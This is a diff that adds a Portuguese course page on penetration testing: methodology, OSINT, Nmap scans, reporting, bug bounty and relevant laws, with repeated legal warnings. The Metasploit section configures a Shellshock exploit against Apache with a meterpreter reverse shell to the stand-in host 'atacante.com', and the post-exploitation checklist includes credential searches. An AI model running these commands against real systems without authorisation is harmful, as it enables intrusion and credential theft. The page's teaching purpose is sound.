@@ -1,0 +1,200 @@
+---
+title: "Testes de Penetração"
+description: "Metodologia de hacking ético, OSINT, scanning, exploração, escalação de privilégios, movimentação lateral, relatórios e programas de Bug Bounty."
+---
+
+# Testes de Penetração (Penetration Testing)
+
+Testes de Penetração (pentesting) é o **ciberataque simulado e autorizado** em um sistema computacional, realizado para avaliar a segurança do sistema. Diferente do hacking malicioso, pentesting é legal, contratado e documentado — com o objetivo explícito de encontrar e corrigir vulnerabilidades antes que atacantes reais o façam.
+
+## Tipos de Testes de Penetração
+
+| Tipo | Escopo | Nível de Conhecimento |
+|------|--------|----------------------|
+| **Black Box (Caixa Preta)** | Testador sem conhecimento prévio do alvo | Simula um atacante externo |
+| **White Box (Caixa Branca)** | Testador com acesso total a código-fonte e arquitetura | Simula uma auditoria completa |
+| **Gray Box (Caixa Cinza)** | Testador com conhecimento parcial | O mais realista para a maioria dos cenários |
+| **Externo (External)** | Alvo em ativos voltados à internet | Simula ataques remotos |
+| **Interno (Internal)** | Testador opera de dentro da rede | Simula ameaça interna (insider threat) |
+| **Red Team (Equipe Vermelha)** | Simulação completa de adversário incluindo engenharia social e acesso físico | Testa todo o programa de segurança |
+
+## A Metodologia de Pentesting
+
+<Steps>
+  <Step title="1. Escopo e Regras de Engajamento (Scoping and Rules of Engagement)">
+    Antes de qualquer teste, o escopo deve ser claramente definido por escrito:
+    - Quais sistemas/redes/aplicações estão dentro do escopo?
+    - O que está explicitamente **fora do escopo**?
+    - Quais métodos são permitidos? (Engenharia social? Acesso físico? DoS?)
+    - Qual é a janela de teste?
+    - **Obtenha autorização por escrito.** Testes sem permissão explícita são crime.
+  </Step>
+  <Step title="2. Reconhecimento — OSINT (Reconnaissance)">
+    Colete o máximo de informação possível sobre o alvo antes de interagir ativamente.
+  </Step>
+  <Step title="3. Scanning e Enumeração (Scanning and Enumeration)">
+    Interaja ativamente com o alvo para identificar portas abertas, serviços rodando e pontos de entrada potenciais.
+  </Step>
+  <Step title="4. Análise de Vulnerabilidades (Vulnerability Analysis)">
+    Mapeie as informações coletadas contra vulnerabilidades conhecidas (CVEs) e configurações incorretas comuns.
+  </Step>
+  <Step title="5. Exploração (Exploitation)">
+    Tente violar o sistema explorando vulnerabilidades identificadas.
+  </Step>
+  <Step title="6. Pós-Exploração (Post-Exploitation)">
+    Após obter acesso inicial, determine o valor do sistema comprometido e tente movimentação lateral.
+  </Step>
+  <Step title="7. Relatório (Reporting)">
+    Documente todas as descobertas, o risco que representam, evidências e recomendações de remediação.
+  </Step>
+</Steps>
+
+## Fase 2: Reconhecimento — OSINT (Open Source Intelligence — Inteligência de Fonte Aberta)
+
+| Técnica | Ferramenta/Fonte | O Que Você Aprende |
+|---------|-----------------|-------------------|
+| Registros DNS | `dig`, `nslookup`, `dnsdumpster.com` | Subdomínios, servidores de e-mail, faixas de IP |
+| WHOIS | `whois`, `who.is` | Registrar de domínio, data de registro, contato |
+| Google Dorking | `site:alvo.com.br filetype:pdf` | Documentos expostos, páginas de login, listagem de diretórios |
+| LinkedIn | Pesquisa por organização | Nomes de funcionários, funções, stack tecnológica |
+| GitHub/GitLab | Busca por repositórios | Código-fonte, credenciais vazadas, documentação interna |
+| Shodan | `shodan.io` | Dispositivos conectados à internet, serviços expostos |
+| Certificate Transparency | `crt.sh` | Todos os certificados TLS emitidos para um domínio (revela subdomínios) |
+
+## Fase 3: Scanning com Nmap
+
+**Nmap** é o padrão da indústria para descoberta de rede e auditoria de segurança.
+
+```bash
+# Scan TCP básico das top 1000 portas
+nmap -sT alvo.com.br
+
+# Scan completo (todas 65535 portas) com detecção de versão
+nmap -p- -sV -sC alvo.com.br
+
+# Scan agressivo (detecção de SO + scripts + traceroute)
+nmap -A alvo.com.br
+```
+
+### Ferramentas de Scanning de Aplicações Web
+
+| Ferramenta | Propósito |
+|-----------|----------|
+| **Burp Suite** | Interceptar, inspecionar e modificar tráfego HTTP. Teste manual e automatizado. |
+| **OWASP ZAP** | Alternativa open-source ao Burp Suite. Scanning automatizado de vulnerabilidades. |
+| **Nikto** | Scanner de servidor web — detecta arquivos perigosos e software desatualizado. |
+| **ffuf / Gobuster** | Força bruta de diretórios e arquivos — descobre caminhos ocultos e painéis admin. |
+| **SQLMap** | Detecção e exploração automatizada de SQL Injection. |
+
+## Fase 5: Exploração com Metasploit
+
+**Metasploit** é o framework de exploração mais usado mundialmente.
+
+```bash
+# Iniciar Metasploit
+msfconsole
+
+# Buscar exploits para um serviço específico
+search type:exploit name:apache
+
+# Selecionar um exploit
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+# Configurar opções do alvo
+set RHOSTS alvo.com.br
+set RPORT 443
+
+# Selecionar payload
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST atacante.com
+
+# Executar
+exploit
+```
+
+<Warning>
+**Aviso legal**: Usar ferramentas de exploração contra sistemas sem autorização explícita e escrita é uma ofensa criminal em virtualmente toda jurisdição. Sempre tenha uma Declaração de Trabalho (SOW — Statement of Work) ou Regras de Engajamento (RoE — Rules of Engagement) assinadas antes de testar.
+</Warning>
+
+## Fase 6: Pós-Exploração (Post-Exploitation)
+
+### Atividades Principais
+
+- **Escalação de Privilégio (Privilege Escalation)**: Mover de um usuário de baixo privilégio para root/administrador. Técnicas incluem exploits de kernel, binários SUID mal configurados e cron jobs com permissões indevidas.
+- **Movimentação Lateral (Lateral Movement)**: Mover do sistema comprometido para outros na rede. Técnicas incluem coleta de credenciais, pass-the-hash e pivoteamento via RDP/SSH.
+- **Exfiltração de Dados (Data Exfiltration)**: Identificar e extrair dados sensíveis (para provar impacto, não para roubar).
+- **Persistência (Persistence)**: Estabelecer mecanismos para manter acesso (contas backdoor, tarefas agendadas, web shells).
+
+### Checklists de Escalação de Privilégio
+
+**Linux:**
+- Verificar `sudo -l` para comandos que o usuário pode rodar como root
+- Buscar binários SUID: `find / -perm -4000 -type f 2>/dev/null`
+- Verificar cron jobs: `cat /etc/crontab`
+- Buscar senhas em arquivos de configuração: `grep -r "password" /etc/ 2>/dev/null`
+
+**Windows:**
+- Verificar `whoami /priv` para privilégios habilitados
+- Buscar caminhos de serviço sem aspas (unquoted service paths)
+- Verificar credenciais armazenadas: `cmdkey /list`
+
+## Fase 7: Relatório (Reporting)
+
+O relatório é o **produto mais importante** de um teste de penetração.
+
+### Estrutura do Relatório
+
+1. **Sumário Executivo**: Visão geral para gestão — postura geral de risco, descobertas críticas, impacto no negócio e recomendações estratégicas. Sem jargão técnico.
+2. **Escopo e Metodologia**: O que foi testado, como e durante que período.
+3. **Descobertas (Findings)**: Cada vulnerabilidade com:
+   - **Título** e **severidade** (Crítica/Alta/Média/Baixa/Informativa)
+   - **Score CVSS** (Common Vulnerability Scoring System)
+   - **Descrição** da vulnerabilidade
+   - **Evidência** (screenshots, pares requisição/resposta)
+   - **Impacto** (o que um atacante poderia alcançar)
+   - **Remediação** (correção específica e acionável)
+4. **Descobertas Positivas**: Quais controles de segurança foram eficazes.
+
+## Programas de Bug Bounty (Recompensa por Bugs)
+
+Programas de bug bounty convidam pesquisadores externos a encontrar e divulgar responsavelmente vulnerabilidades — em troca de recompensas monetárias.
+
+### Plataformas Principais
+
+| Plataforma | Programas Notáveis |
+|-----------|-------------------|
+| **HackerOne** | US DoD, Uber, GitHub, Shopify |
+| **Bugcrowd** | Tesla, Mastercard, Netflix |
+| **Intigriti** | Focada na Europa, compatível com GDPR |
+
+### Começando em Bug Bounty
+
+1. **Aprenda os fundamentos** (este curso é um bom começo).
+2. **Pratique em alvos legais**: HackTheBox, TryHackMe, PortSwigger Web Security Academy, OWASP WebGoat.
+3. **Leia relatórios divulgados**: O feed Hacktivity do HackerOne mostra relatórios reais de bugs.
+4. **Comece com frutos baixos**: Foque em IDOR, XSS e vazamento de informação antes de tentar cadeias complexas.
+5. **Escreva relatórios claros**: A qualidade do seu relatório é tão importante quanto a vulnerabilidade.
+
+## Framework Legal e Ético
+
+### Leis Relevantes
+
+| Jurisdição | Lei |
+|-----------|-----|
+| **Brasil** | **Lei 12.737/2012 (Lei Carolina Dieckmann)** — criminaliza o acesso não autorizado a sistemas computacionais. **Marco Civil da Internet (Lei 12.965/2014)** — estabelece direitos e deveres no uso da internet. |
+| **EUA** | Computer Fraud and Abuse Act (CFAA) |
+| **UE** | EU Directive on Attacks Against Information Systems (2013/40/EU) |
+| **UK** | Computer Misuse Act 1990 |
+
+<Warning>
+**Autorização é inegociável**: Testar sem permissão é crime, ponto final. No Brasil, a **Lei Carolina Dieckmann (Lei 12.737/2012)** prevê pena de detenção de 3 meses a 1 ano para invasão de dispositivo informático alheio.
+</Warning>
+
+## Principais Conclusões
+
+1. **Metodologia importa**: Siga uma abordagem estruturada — reconhecimento, scanning, exploração, pós-exploração, relatório.
+2. **OSINT é poderoso**: Informação publicamente disponível frequentemente revela mais que scanning técnico.
+3. **Autorização é inegociável**: Testes sem permissão são crime, ponto final.
+4. **O relatório é o produto**: Uma vulnerabilidade descoberta mas mal comunicada não tem valor.
+5. **Pratique legalmente**: Use HackTheBox, TryHackMe e programas de bug bounty para construir habilidades.
+6. **Pense como atacante, aja como profissional**: O objetivo é melhorar a segurança, não causar dano.
